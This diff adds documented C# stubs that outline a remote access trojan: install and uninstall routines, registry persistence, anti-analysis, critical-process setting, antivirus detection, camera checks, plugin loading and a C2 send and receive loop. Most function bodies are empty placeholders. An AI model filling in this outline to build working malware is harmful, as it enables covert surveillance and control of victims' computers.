@@ -1,0 +1,306 @@
+/**
+ * @brief Retrieves the active window's title and encodes it in Base64.
+ *
+ * @return Base64 encoded title of the active window, or empty string if unavailable
+ */
+public static string ACT()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Converts a byte array to a UTF-8 string
+ * 
+ * @param B Reference to the byte array to convert
+ * @return UTF-8 string representation of the byte array
+ */
+public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);
+
+/**
+ * @brief Checks if a camera is available on the system
+ * 
+ * @return true if at least one camera device is detected, false otherwise
+ */
+public static bool Cam()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Retrieves information about a camera driver
+ * 
+ * @param wDriver The index of the camera driver to query
+ * @param lpszName Buffer to receive the driver name
+ * @param cbName Size of the name buffer
+ * @param lpszVer Buffer to receive the driver version
+ * @param cbVer Size of the version buffer
+ * @return true if successful, false otherwise
+ */
+public static extern bool capGetDriverDescriptionA(
+  // Parameters
+);
+
+/**
+ * @brief Compares the directories of two FileInfo objects
+ * 
+ * @param F1 First FileInfo object
+ * @param F2 Second FileInfo object
+ * @return true if both files are in the same directory tree, false otherwise
+ */
+private static bool CompDir(FileInfo F1, FileInfo F2)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Establishes a connection to the remote server
+ * 
+ * @return true if connection was successfully established, false otherwise
+ */
+public static bool connect()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Decodes a Base64 encoded string
+ * 
+ * @param s Reference to the Base64 encoded string
+ * @return Decoded string
+ */
+public static string DEB(ref string s)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Deletes a registry value from the current user's registry
+ * 
+ * @param n Name of the registry value to delete
+ */
+public static void DLV(string n)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Calls the process manipulation method with parameter 0
+ */
+public static void ED() => OK.pr(0);
+
+/**
+ * @brief Encodes a string in Base64
+ * 
+ * @param s Reference to the string to encode
+ * @return Base64 encoded string
+ */
+public static string ENB(ref string s) => Convert.ToBase64String(OK.SB(ref s));
+
+/**
+ * @brief Gets a handle to the currently active window
+ * 
+ * @return Handle to the foreground window
+ */
+[DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+public static extern IntPtr GetForegroundWindow();
+
+/**
+ * @brief Retrieves information about the file system and volume
+ * 
+ * @param lpRootPathName Root path of the volume
+ * @param lpVolumeNameBuffer Buffer to receive the volume name
+ * @param nVolumeNameSize Size of the volume name buffer
+ * @param lpVolumeSerialNumber Pointer to receive the volume serial number
+ * @param lpMaximumComponentLength Pointer to receive the maximum component length
+ * @param lpFileSystemFlags Pointer to receive the file system flags
+ * @param lpFileSystemNameBuffer Buffer to receive the file system name
+ * @param nFileSystemNameSize Size of the file system name buffer
+ * @return Nonzero on success, zero on failure
+ */
+[DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
+private static extern int GetVolumeInformation(
+  // Parameters
+);
+
+/**
+ * @brief Gets the text of the specified window
+ * 
+ * @param hWnd Handle to the window
+ * @param WinTitle Buffer to receive the window text
+ * @param MaxLength Maximum number of characters to copy
+ * @return The number of characters copied
+ */
+[DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
+public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);
+
+/**
+ * @brief Retrieves the name of the installed antivirus product
+ * 
+ * @return Name of the antivirus product, or "No AV" if none found
+ */
+public static string GetAntiVirus()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Gets a value from the registry or returns the default if not found
+ * 
+ * @param n Registry value name
+ * @param ret Default value to return if the registry value is not found
+ * @return Registry value or default value
+ */
+public static object GTV(string n, object ret)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Gets the hardware ID (volume serial number)
+ * 
+ * @return Volume serial number as a hex string, or "ERR" on failure
+ */
+public static string HWD()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Handles incoming data from the remote server
+ * 
+ * @param b Byte array containing the received data
+ */
+[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
+public static void Ind(byte[] b)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Builds system information data to be sent to the server
+ * 
+ * @return Formatted string containing system information
+ */
+public static string inf()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Installs the malware on the system
+ */
+[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
+public static void INS()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Initializes malware operations including persistence, anti-analysis, and command loop
+ */
+[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
+public static void ko()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Calculates the MD5 hash of a byte array
+ * 
+ * @param B Byte array to hash
+ * @return MD5 hash as a hexadecimal string
+ */
+public static string md5(byte[] B)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Loads a plugin from a byte array
+ * 
+ * @param b Byte array containing the plugin assembly
+ * @param c Class identifier to instantiate
+ * @return Instance of the plugin class or null if not found
+ */
+public static object Plugin(byte[] b, string c)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Sets process critical status to control termination behavior
+ * 
+ * @param i Value to set (0 for normal, 1 for critical)
+ */
+public static void pr(int i)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Maintains connection with C2 server and handles incoming data
+ */
+public static void RC()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Converts a string to a UTF-8 byte array
+ * 
+ * @param S Reference to the string to convert
+ * @return UTF-8 byte array
+ */
+public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);
+
+/**
+ * @brief Sends a string to the remote server
+ * 
+ * @param S String to send
+ * @return true if sent successfully, false otherwise
+ */
+public static bool Send(string S) => OK.Sendb(OK.SB(ref S));
+
+/**
+ * @brief Sends a byte array to the remote server
+ * 
+ * @param b Byte array to send
+ * @return true if sent successfully, false otherwise
+ */
+public static bool Sendb(byte[] b)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Sets a registry value in the current user's registry
+ * 
+ * @param n Name of the registry value
+ * @param t Value to set
+ * @param typ Registry value type
+ * @return true if successful, false otherwise
+ */
+public static bool STV(string n, object t, RegistryValueKind typ)
+{
+  // Function implementation
+}
+
+/**
+ * @brief Uninstalls the malware from the system
+ */
+[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
+public static void UNS()
+{
+  // Function implementation
+}
+
+/**
+ * @brief Decompresses a byte array using GZip
+ * 
+ * @param B Compressed byte array
+ * @return Decompressed byte array
+ */
+public static byte[] ZIP(byte[] B)
+{
+  // Function implementation
+}
